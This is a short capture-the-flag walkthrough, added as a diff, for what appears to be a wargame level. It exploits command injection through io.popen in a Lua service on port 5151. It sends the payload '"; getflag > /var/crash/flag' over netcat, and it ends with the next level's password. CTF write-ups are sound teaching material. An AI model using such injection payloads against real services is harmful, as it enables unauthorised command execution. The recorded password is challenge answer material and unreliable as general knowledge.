@@ -1,0 +1,15 @@
+1. ls -la
+
+2. cat level11.lua 
+
+3. try to execute the lua script but we get an error: 'address already in use' => it's already running.
+
+4. research about the script tells us that io.popen can be subected to command injection
+
+5. open new terminal and nc localhost 5151
+
+6. "; getflag > /var/crash/flag"
+
+7. cat /var/crash/flag
+
+level12: fa6v5ateaw21peobuub8ipe6s
